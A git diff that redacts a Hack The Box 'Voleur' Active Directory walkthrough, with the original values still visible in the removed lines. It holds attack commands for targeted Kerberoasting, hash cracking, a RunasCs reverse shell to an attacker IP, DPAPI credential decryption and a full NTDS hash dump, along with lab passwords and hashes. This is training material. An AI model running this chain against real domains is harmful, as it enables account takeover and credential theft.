@@ -16,9 +16,9 @@ Author: [baseDN](https://app.hackthebox.com/users/1514235)
 ## Enumeration
 ### Nmap
 ```bash
-└─$ sudo nmap -Pn -sC -sV 10.129.98.35                                                     
+└─$ sudo nmap -Pn -sC -sV 10.129.xx.xx                                                     
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-06 09:50 EDT
-Nmap scan report for 10.129.98.35 (10.129.98.35)
+Nmap scan report for 10.129.xx.xx (10.129.xx.xx)
 Host is up (0.20s latency).
 Not shown: 987 filtered tcp ports (no-response)
 PORT     STATE SERVICE       VERSION
@@ -58,15 +58,15 @@ Nmap done: 1 IP address (1 host up) scanned in 82.46 seconds
 
 Add these to `/etc/hosts` file:
 ```bash
-10.129.98.35     voleur.htb dc.voleur.htb
+10.129.xx.xx     voleur.htb dc.voleur.htb
 ```
 
 ### Enum users
 So this machine using kerberos service, so we need to modify the `/etc/krb5.conf` file to use the correct domain.
 ```bash
-└─$ sudo nxc smb 10.129.98.35 -u 'ryan.naylor' -p 'HollowOct31Nyt' --generate-krb5-file krb5.conf
-SMB         10.129.98.35    445    10.129.98.35     [*]  x64 (name:10.129.98.35) (domain:10.129.98.35) (signing:True) (SMBv1:False) (NTLM:False)
-SMB         10.129.98.35    445    10.129.98.35     [-] 10.129.98.35\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED
+└─$ sudo nxc smb 10.129.xx.xx -u 'ryan.naylor' -p 'HollowOct31Nyt' --generate-krb5-file krb5.conf
+SMB         10.129.xx.xx    445    10.129.xx.xx     [*]  x64 (name:10.129.xx.xx) (domain:10.129.xx.xx) (signing:True) (SMBv1:False) (NTLM:False)
+SMB         10.129.xx.xx    445    10.129.xx.xx     [-] 10.129.xx.xx\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED
 ```
 
 ```bash
@@ -75,18 +75,18 @@ SMB         10.129.98.35    445    10.129.98.35     [-] 10.129.98.35\ryan.naylor
 [libdefaults]
     dns_lookup_kdc = false
     dns_lookup_realm = false
-    default_realm = 10.129.98.35
+    default_realm = 10.129.xx.xx
 
 [realms]
-    10.129.98.35 = {
-        kdc = 10.129.98.35.10.129.98.35
-        admin_server = 10.129.98.35.10.129.98.35
-        default_domain = 10.129.98.35
+    10.129.xx.xx = {
+        kdc = 10.129.xx.xx.10.129.xx.xx
+        admin_server = 10.129.xx.xx.10.129.xx.xx
+        default_domain = 10.129.xx.xx
     }
 
 [domain_realm]
-    .10.129.98.35 = 10.129.98.35
-    10.129.98.35 = 10.129.98.35
+    .10.129.xx.xx = 10.129.xx.xx
+    10.129.xx.xx = 10.129.xx.xx
 ```
 
 Just change the `ip` to `host` and add some stuff to the file.
@@ -118,13 +118,13 @@ Replace this file to `/etc/krb5.conf`.
 Now we gonna request **Ticket Granting Ticket** for `ryan.naylor` user.
 
 ```bash
-└─$ getTGT.py -dc-ip 10.129.98.35 'voleur.htb/ryan.naylor:HollowOct31Nyt'
+└─$ getTGT.py -dc-ip 10.129.xx.xx 'voleur.htb/ryan.naylor:HollowOct31Nyt'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Saving ticket in ryan.naylor.ccache
 ```
 
-> Remember to `sudo rdate -n 10.129.98.35` to sync the time incase of clock skew.
+> Remember to `sudo rdate -n 10.129.xx.xx` to sync the time incase of clock skew.
 
 Next we will set the ticket to the environment variable.
 
@@ -323,21 +323,21 @@ Cost 1 (MS Office version) is 2013 for all loaded hashes
 Cost 2 (iteration count) is 100000 for all loaded hashes
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-football1        (Access_Review.xlsx)     
-1g 0:00:00:02 DONE (2025-07-06 18:41) 0.4048g/s 336.8p/s 336.8c/s 336.8C/s football1..legolas
+footxxxxx        (Access_Review.xlsx)     
+1g 0:00:00:02 DONE (2025-07-06 18:41) 0.4048g/s 336.8p/s 336.8c/s 336.8C/s footxxxxx..legolas
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
 ```bash
 └─$ john access_review_hash.txt --show
-Access_Review.xlsx:football1
+Access_Review.xlsx:footxxxxx
 
 1 password hash cracked, 0 left
 ```
 
 Got the password for the excel file, let's open it. <br>
-&rarr; `Access_Review.xlsx:football1`
+&rarr; `Access_Review.xlsx:footxxxxx`
 
 ![voleur-htb-season8-excel](/assets/img/voleur-htb-season8/voleur-htb-season8-excel.png)
 
@@ -346,7 +346,7 @@ So we got some information, let's summarize it.
 - `Ryan.Naylor`, `Marie.Bryant` are from First-Line Support Technician.
 - `Lacey.Miller`, `Todd.Wolfe` from Second-Line Support Technician and has permissions on Remote Management Users.
 
-> *Note:* `Todd.Wolfe` is being crossed out in the excel file and but we know the password was reset to `NightT1meP1dg3on14`
+> *Note:* `Todd.Wolfe` is being crossed out in the excel file and but we know the password was reset to `NightT1meP1dgxxxxx`
 
 **Chance** can be restore this account so we can gain further access and even more information for later escalation.
 
@@ -359,15 +359,15 @@ So we got some information, let's summarize it.
 Next will be note about **Some service accounts**.
 
 - `svc_backup` has permissions on Windows Backup but we need to ask `Jeremy.Combs` maybe the password or something else.
-- `svc_ldap` has permissions on LDAP Services and has password `M1XyC9pW7qT5Vn`.
-- `svc_iis` has permissions on IIS Administration and has password `N5pXyW1VqM7CZ8`.
+- `svc_ldap` has permissions on LDAP Services and has password `M1XyC9pW7qxxxx`.
+- `svc_iis` has permissions on IIS Administration and has password `N5pXyW1VqMxxxx`.
 - `svc_winrm` has permissions on Remote Management and got a note that "Need to ask `Lacey` because she has reset this recently".
 
 Got lot of great stuffs, let's check with `BloodHound`.
 
 ### BloodHound
 ```bash
-└─$ bloodhound-python -u 'ryan.naylor' -p 'HollowOct31Nyt' -d voleur.htb -c All -o bloodhound_results.json -ns 10.129.98.35 -k
+└─$ bloodhound-python -u 'ryan.naylor' -p 'HollowOct31Nyt' -d voleur.htb -c All -o bloodhound_results.json -ns 10.129.xx.xx -k
 INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
 INFO: Found AD domain: voleur.htb
 INFO: Using TGT from cache
@@ -402,7 +402,7 @@ After look around, we got some interesting things to take a look.
 ### Kerberoasting
 Let's request the **Ticket Granting Ticket** for `svc_ldap` user.
 ```bash
-└─$ getTGT.py -dc-ip 10.129.98.35 'voleur.htb/svc_ldap:M1XyC9pW7qT5Vn'
+└─$ getTGT.py -dc-ip 10.129.xx.xx 'voleur.htb/svc_ldap:M1XyC9pW7qxxxx'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Saving ticket in svc_ldap.ccache
@@ -422,11 +422,11 @@ Then use [targetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerbero
 [*] Fetching usernames from Active Directory with LDAP
 [VERBOSE] SPN added successfully for (lacey.miller)
 [+] Printing hash for (lacey.miller)
-$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$5d5c60668aa39cee9c7ced2226c2ef6f$e850ecf7aebf724db9d23ce7b34b607d63d1f0f951b10f6caf842c47bf6962f2eba8ae6e56c966563e3f1ea5a1db4757826aa2a5243d6eb6186723ca4fa94c8387bf33c83992d452a71b16db039b75140a49397922e95db8ce99d5722350a82443598b020cf5f8748867a1eb400b34613cb2e4df4e00b86ad4b774847cb07f6d0f8f400bfd8f62d5e0ce38a1d274e88e9cff81f5a27e6cab4a7e66d9b31c8e4b146a222d02ff41eca5a1d6d6e440368612e4ee8478e150d173a878f2f3372ea7bd6b4e6f71e7ec23392e886ff200a607502e8dd5f8ceec0a1f4e41eddde1a3215b6b60e5c9715ccce6b700646aa1303db7f7b76a7ff4fe40320fb76a4d1ef56e47b39070f9421ce568af0acac1e2bf3b3e7b251a8e5e84d658994244db761bb249b07a3746dc378c5f715065fcd53fa47854f545d8e4a6ac91f38bf94e81e0e4f9cb0436aee09173e49180e75156543be3c0d46ae015d8968bcf2ec33a807a4201050ad5d7b0f09fb85d2c4b02856886019373283b1288cadfc998f428c131c809744bddaf60b9d55b6d787ebc3676c2727f0d3bc3a9b74c5e08fabbb96e6d792065167ea3f17c5d01350d45aec2b1eedaefbb1ab3ee97613f96c27ad0a1ec66c0bb9fad633b9653da533bfe2199299d59389c3c90fa7af18f50283cef5fc2d8784dfe0f026aa68624e135d2a45a33b59528485dddeb5d2a5ef598ebbdef94442ab852f0432f791f09916c2a1979126def29e0df2af615d284ae108fa652fa144c4a4ed6f0c9a5de1b9ce7b1a7defee983d32b258941a5508e368e2f379e66014dce8345200e2c6d73d4ea27d1f1d1613a119aeaf0853a414e85a5e957f297bec3bd5d8998343a043ffb34376454db50811fc9efeb9377109491d9b57d342dba0f00a7316a1fcb906c9b0e18826b337f909bf525c81d5c10a5ed34c12cd5229e5ebc9d55a4c99e63313ba4d0efcec81f0c46cf8cc4d94f51ef3c0ac1a56e70c024dad8cc231dd87aeac2f71c4ad5ae68cf79cd32d4020a9daec6312eacf30a4daad6bb9e3be6478ec5351cdb709d7acdfdf908e482c05591f335f28fce53b20a2ef1937dd00c34f8602bdf335d9ad2e74fad92dac2caf42244d2092369845de0bfd8f910db2d76b2538a3a9e5b0c758aa0b4902d1fa4039c1dd01df36e8933ea7a8eabcd324f83e9cb4e3e443f27547571ba8376a48c343e9fb851f743be0e751587dabee01ec2de95df36e7d74984a1c3cc52a7e61e98beeff0049ab1b902b770f9ee8ea2beff4d097ebdccf7de6359a96b4ee90a4298a24f7af1afa125de1798668ebb2acb1a435c7a5f2f05a4b450898cc245a24e478aa4ec41e3aefef429ebfb15f0e843a4e218ddfac6552d9b7bc31e4a1683bb927764d0ad83abe6a575c74a3c029a77a2bf91d714c0507a73ddab7e21195381adc4cabc9dacd8143957b434501540cb4d27e2a340e4b34232a679c319
+$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$5d5c60668aa39cee9c7ced2226c2ef6f$<SNIP>
 [VERBOSE] SPN removed successfully for (lacey.miller)
 [VERBOSE] SPN added successfully for (svc_winrm)
 [+] Printing hash for (svc_winrm)
-$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$63b0c781e9733300f29fd34b6ce6f80b$7f60183ac27a531ce4a87edba590af29e2d15b2dcf6559f32c03c59b3d359350554550ecbe7558201963f731d9ab2e00e3c530948aa2bd90012ca19b2910ee954e527e39fdafc3993fbd40a234c42e3adcd78363a0d4e15f75cf166bb0a0645028b0cbc4f897eb06a053a0bd47c4727b7219f4d647e77b64a18da1043951251aefeb251c0461cd9b10c9a97f981030d5a0479ac8b5925ccaa0e73cb65907f3be98156b4021e628bbad237929de5fc017318ab7336829f3dfb687cfb13ec80330f76f3429acdabdf842e6516acf6c621abd2700d308c48701fb95f7cad7733cf4c03d25b8c118b960a46618f8d7d73cea71e102b154162a4ac3ecb76c32998b0eb29d252782cdeea9a0d2d3e045ee4fa9adf2be04e20f64082ad5959ea156bf92c0813101e8bdb0ae40571171f9b44afa08b63e0b1437333c48cd665143b443513d6bae6723a3d3ae6bef337b72cf9e8bb9a477ad433bd7ba3493ff070b5b40a89c9951220f161617453e72cdb4079e330d1e899f7d7c339dd642bde8bafac8ab02d938d09e7a0b78151a3640ca3ba068718c234968568c259a008501f7603bfb8306b0679e4fb8b4644b065361edc80d2a19f4fdfbfca17dd47434472ff7366ea78bdf9dc1fbd8553d3d8039c14bcb1cdd80d7d2f05fac9fda9ce4b1a878d613b2ad6a50024cd6d6189bd4aad893183774b3f580bfb5cb348aa2fefb6a523df21baa21c6387dcae90fb71e2433fc387801df78c7e410968fb04089b84da68c3f035a08ed178d0d9cf1a5ff1ab4106a2c3ea9591288d8e8aabe1936635c83c2cb4a57f6a89a65cea62cb02b6ee77511a5a4c47000770efea49cd63dc8d7d80fd25314b05ff7078dea279b1aea2306ebea414f5ba9d45cba92f59ed4418a3d67aefb17b6d292b5c1eac4d19fbd52040fced74ddb30db41b0e957202c57465eb5eb76290f32a6c7c286c466146af6b50180ce8260991156ae876e4040f52be2a2a6bcaeb7f6b3423fd5cb8e127e96608de7b2e0a6865cccca70b4ebd34f1e67c50b3aea0325dfd6ac1b72fea91627627cb40e910a7c34d204af2b649554f0097d8229b3912bf6b28caad5f701c0c0d8a5d124ac16ec04e856cbc76cf97f548a73e123822736f09763a6cbf47ddd9400b8a002bb8b533c46276d8a808a0c24309e39230c0f19f66a207f9b58dfb780b4fb607794e26940cc9f6a7294092e54a96af6b2634b5d99899160bc5b0005be30a6427c9578502ef35ea4466792c6f58346cee238f3f9858600118b633f0639afc00ba438aaa5f371b837a0f1a6ba3d928c0424215e5906e61292eff0250c0545121f94caffb197f9c2deb22562fba84426ba9e2b70db08802fadb16b7d328dbcbd5746a04e70cb0ae38db2f083edd70d90c46e31ccabdb31e0dbf7d23162fb0d3e8563d2a03d699a2e6e84fb4824926b7cc5f729dcebbb8b973df57e73f3b3dbf378a17ddd
+$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$63b0c781e9733300f29fd34b6ce6f80b$<SNIP>
 [VERBOSE] SPN removed successfully for (svc_winrm)https://github.com/ShutdownRepo/targetedKerberoast/blob/main/targetedKerberoast.py
 ```
 
@@ -498,21 +498,21 @@ Cracking performance lower than expected?
 * Create more work items to make use of your parallelization power:
   https://hashcat.net/faq/morework
 
-$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$63b0c781e9733300f29fd34b6ce6f80b$7f60183ac27a531ce4a87edba590af29e2d15b2dcf6559f32c03c59b3d359350554550ecbe7558201963f731d9ab2e00e3c530948aa2bd90012ca19b2910ee954e527e39fdafc3993fbd40a234c42e3adcd78363a0d4e15f75cf166bb0a0645028b0cbc4f897eb06a053a0bd47c4727b7219f4d647e77b64a18da1043951251aefeb251c0461cd9b10c9a97f981030d5a0479ac8b5925ccaa0e73cb65907f3be98156b4021e628bbad237929de5fc017318ab7336829f3dfb687cfb13ec80330f76f3429acdabdf842e6516acf6c621abd2700d308c48701fb95f7cad7733cf4c03d25b8c118b960a46618f8d7d73cea71e102b154162a4ac3ecb76c32998b0eb29d252782cdeea9a0d2d3e045ee4fa9adf2be04e20f64082ad5959ea156bf92c0813101e8bdb0ae40571171f9b44afa08b63e0b1437333c48cd665143b443513d6bae6723a3d3ae6bef337b72cf9e8bb9a477ad433bd7ba3493ff070b5b40a89c9951220f161617453e72cdb4079e330d1e899f7d7c339dd642bde8bafac8ab02d938d09e7a0b78151a3640ca3ba068718c234968568c259a008501f7603bfb8306b0679e4fb8b4644b065361edc80d2a19f4fdfbfca17dd47434472ff7366ea78bdf9dc1fbd8553d3d8039c14bcb1cdd80d7d2f05fac9fda9ce4b1a878d613b2ad6a50024cd6d6189bd4aad893183774b3f580bfb5cb348aa2fefb6a523df21baa21c6387dcae90fb71e2433fc387801df78c7e410968fb04089b84da68c3f035a08ed178d0d9cf1a5ff1ab4106a2c3ea9591288d8e8aabe1936635c83c2cb4a57f6a89a65cea62cb02b6ee77511a5a4c47000770efea49cd63dc8d7d80fd25314b05ff7078dea279b1aea2306ebea414f5ba9d45cba92f59ed4418a3d67aefb17b6d292b5c1eac4d19fbd52040fced74ddb30db41b0e957202c57465eb5eb76290f32a6c7c286c466146af6b50180ce8260991156ae876e4040f52be2a2a6bcaeb7f6b3423fd5cb8e127e96608de7b2e0a6865cccca70b4ebd34f1e67c50b3aea0325dfd6ac1b72fea91627627cb40e910a7c34d204af2b649554f0097d8229b3912bf6b28caad5f701c0c0d8a5d124ac16ec04e856cbc76cf97f548a73e123822736f09763a6cbf47ddd9400b8a002bb8b533c46276d8a808a0c24309e39230c0f19f66a207f9b58dfb780b4fb607794e26940cc9f6a7294092e54a96af6b2634b5d99899160bc5b0005be30a6427c9578502ef35ea4466792c6f58346cee238f3f9858600118b633f0639afc00ba438aaa5f371b837a0f1a6ba3d928c0424215e5906e61292eff0250c0545121f94caffb197f9c2deb22562fba84426ba9e2b70db08802fadb16b7d328dbcbd5746a04e70cb0ae38db2f083edd70d90c46e31ccabdb31e0dbf7d23162fb0d3e8563d2a03d699a2e6e84fb4824926b7cc5f729dcebbb8b973df57e73f3b3dbf378a17ddd:AFireInsidedeOzarctica980219afi
+$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$63b0c781e9733300f29fd34b6ce6f80b$<SNIP>:AFireInsidedeOzarcticaxxxxxxxxx
 ```
 
 ```bash
 └─$ hashcat -m 13100 kerberos_hashes.txt /usr/share/wordlists/rockyou.txt --show
-$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$63b0c781e9733300f29fd34b6ce6f80b$7f60183ac27a531ce4a87edba590af29e2d15b2dcf6559f32c03c59b3d359350554550ecbe7558201963f731d9ab2e00e3c530948aa2bd90012ca19b2910ee954e527e39fdafc3993fbd40a234c42e3adcd78363a0d4e15f75cf166bb0a0645028b0cbc4f897eb06a053a0bd47c4727b7219f4d647e77b64a18da1043951251aefeb251c0461cd9b10c9a97f981030d5a0479ac8b5925ccaa0e73cb65907f3be98156b4021e628bbad237929de5fc017318ab7336829f3dfb687cfb13ec80330f76f3429acdabdf842e6516acf6c621abd2700d308c48701fb95f7cad7733cf4c03d25b8c118b960a46618f8d7d73cea71e102b154162a4ac3ecb76c32998b0eb29d252782cdeea9a0d2d3e045ee4fa9adf2be04e20f64082ad5959ea156bf92c0813101e8bdb0ae40571171f9b44afa08b63e0b1437333c48cd665143b443513d6bae6723a3d3ae6bef337b72cf9e8bb9a477ad433bd7ba3493ff070b5b40a89c9951220f161617453e72cdb4079e330d1e899f7d7c339dd642bde8bafac8ab02d938d09e7a0b78151a3640ca3ba068718c234968568c259a008501f7603bfb8306b0679e4fb8b4644b065361edc80d2a19f4fdfbfca17dd47434472ff7366ea78bdf9dc1fbd8553d3d8039c14bcb1cdd80d7d2f05fac9fda9ce4b1a878d613b2ad6a50024cd6d6189bd4aad893183774b3f580bfb5cb348aa2fefb6a523df21baa21c6387dcae90fb71e2433fc387801df78c7e410968fb04089b84da68c3f035a08ed178d0d9cf1a5ff1ab4106a2c3ea9591288d8e8aabe1936635c83c2cb4a57f6a89a65cea62cb02b6ee77511a5a4c47000770efea49cd63dc8d7d80fd25314b05ff7078dea279b1aea2306ebea414f5ba9d45cba92f59ed4418a3d67aefb17b6d292b5c1eac4d19fbd52040fced74ddb30db41b0e957202c57465eb5eb76290f32a6c7c286c466146af6b50180ce8260991156ae876e4040f52be2a2a6bcaeb7f6b3423fd5cb8e127e96608de7b2e0a6865cccca70b4ebd34f1e67c50b3aea0325dfd6ac1b72fea91627627cb40e910a7c34d204af2b649554f0097d8229b3912bf6b28caad5f701c0c0d8a5d124ac16ec04e856cbc76cf97f548a73e123822736f09763a6cbf47ddd9400b8a002bb8b533c46276d8a808a0c24309e39230c0f19f66a207f9b58dfb780b4fb607794e26940cc9f6a7294092e54a96af6b2634b5d99899160bc5b0005be30a6427c9578502ef35ea4466792c6f58346cee238f3f9858600118b633f0639afc00ba438aaa5f371b837a0f1a6ba3d928c0424215e5906e61292eff0250c0545121f94caffb197f9c2deb22562fba84426ba9e2b70db08802fadb16b7d328dbcbd5746a04e70cb0ae38db2f083edd70d90c46e31ccabdb31e0dbf7d23162fb0d3e8563d2a03d699a2e6e84fb4824926b7cc5f729dcebbb8b973df57e73f3b3dbf378a17ddd:AFireInsidedeOzarctica980219afi
+$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$63b0c781e9733300f29fd34b6ce6f80b$<SNIP>:AFireInsidedeOzarcticaxxxxxxxxx
 ```
 
 So we can only crack `svc_winrm` password. <br>
-&rarr; `svc_winrm:AFireInsidedeOzarctica980219afi`.
+&rarr; `svc_winrm:AFireInsidedeOzarcticaxxxxxxxxx`.
 
 Request the **Ticket Granting Ticket** for `svc_winrm` user.
 
 ```bash
-└─$ getTGT.py -dc-ip 10.129.98.35 'voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi'
+└─$ getTGT.py -dc-ip 10.129.xx.xx 'voleur.htb/svc_winrm:AFireInsidedeOzarcticaxxxxxxxxx'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Saving ticket in svc_winrm.ccache
@@ -551,7 +551,7 @@ Mode                 LastWriteTime         Length Name
 
 
 *Evil-WinRM* PS C:\Users\svc_winrm\Desktop> type user.txt
-8c103ff6981c5d164824c7d6f9152441
+8c103fxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Got the `user.txt` flag.
@@ -595,7 +595,7 @@ listening on [any] 3333 ...
 On `svc_winrm` session, run the `RunasCs.exe` with the `svc_ldap` user.
 
 ```powershell
-*Evil-WinRM* PS C:\Temp> .\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn cmd.exe -r 10.10.14.48:3333
+*Evil-WinRM* PS C:\Temp> .\RunasCs.exe svc_ldap M1XyC9pW7qxxxx cmd.exe -r 10.xx.xx.xx:3333
 [*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
 
 [+] Running in session 0 with process function CreateProcessWithLogonW()
@@ -608,7 +608,7 @@ Check back our kali machine.
 ```bash
 └─$ rlwrap -cAr nc -lvnp 3333
 listening on [any] 3333 ...
-connect to [10.10.14.48] from (UNKNOWN) [10.129.98.35] 54938
+connect to [10.xx.xx.xx] from (UNKNOWN) [10.129.xx.xx] 54938
 Microsoft Windows [Version 10.0.20348.3807]
 (c) Microsoft Corporation. All rights reserved.
 
@@ -710,7 +710,7 @@ The command completed successfully.
 Let's request the **Ticket Granting Ticket** for `todd.wolfe` user.
 
 ```bash
-└─$ getTGT.py -dc-ip 10.129.98.35 'voleur.htb/todd.wolfe:NightT1meP1dg3on14'
+└─$ getTGT.py -dc-ip 10.129.xx.xx 'voleur.htb/todd.wolfe:NightT1meP1dgxxxxx'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Saving ticket in todd.wolfe.ccache
@@ -808,7 +808,7 @@ Got the DPAPI master key. <br>
 We gonna decrypt a master key first with the credentials we got.
 
 ```bash
-└─$ dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
+└─$ dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dgxxxxx
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [MASTERKEYFILE]
@@ -893,16 +893,16 @@ Target      : Domain:target=Jezzas_Account
 Description : 
 Unknown     : 
 Username    : jeremy.combs
-Unknown     : qT3V9pLXyN7W4m
+Unknown     : qT3V9pLXyxxxxx
 ```
 
 Nail the credentials from the `jeremy.combs` user.
-&rarr; `jeremy.combs:qT3V9pLXyN7W4m`
+&rarr; `jeremy.combs:qT3V9pLXyxxxxx`
 
 Just redo the request for the **Ticket Granting Ticket** for `jeremy.combs` user and change the `KRB5CCNAME` environment variable.
 
 ```bash
-└─$ getTGT.py -dc-ip 10.129.98.35 'voleur.htb/jeremy.combs:qT3V9pLXyN7W4m'
+└─$ getTGT.py -dc-ip 10.129.xx.xx 'voleur.htb/jeremy.combs:qT3V9pLXyxxxxx'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Saving ticket in jeremy.combs.ccache
@@ -968,35 +968,6 @@ Now ssh to `svc_backup` user.
 
 ```bash
 └─$ ssh svc_backup@voleur.htb -i id_rsa -p 2222
-The authenticity of host '[voleur.htb]:2222 ([10.129.98.35]:2222)' can't be established.
-ED25519 key fingerprint is SHA256:mKWAEwLTnEN2bJNi7fkc+BZodiXCIiP3ywSLJiZL0ss.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '[voleur.htb]:2222' (ED25519) to the list of known hosts.
-Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Mon Jul  7 10:09:50 PDT 2025
-
-  System load:    0.52      Processes:             9
-  Usage of /home: unknown   Users logged in:       0
-  Memory usage:   33%       IPv4 address for eth0: 10.129.98.35
-  Swap usage:     0%
-
-
-363 updates can be installed immediately.
-257 of these updates are security updates.
-To see these additional updates run: apt list --upgradable
-
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
-
-Last login: Thu Jan 30 04:26:24 2025 from 127.0.0.1
- * Starting OpenBSD Secure Shell server sshd                                                                                                                                                                                                                                                                         [ OK ] 
 svc_backup@DC:~$
 ```
 
@@ -1044,59 +1015,20 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] Searching for pekList, be patient
 [*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
 [*] Reading and decrypting hashes from ntds.dit 
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
-voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
-voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
-voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
-voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
-voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
-voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
-voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
-voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:<SNIP>:::
+<SNIP>
 [*] Kerberos keys from ntds.dit 
-Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
-Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
-Administrator:des-cbc-md5:459d836b9edcd6b0
-DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
-DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
-DC$:des-cbc-md5:64e05b6d1abff1c8
-krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
-krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
-krbtgt:des-cbc-md5:34ae31d073f86d20
-voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
-voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
-voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
-voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
-voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
-voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
-voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
-voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
-voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
-voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
-voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
-voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
-voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
-voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
-voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
-voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
-voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
-voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
-voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
-voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
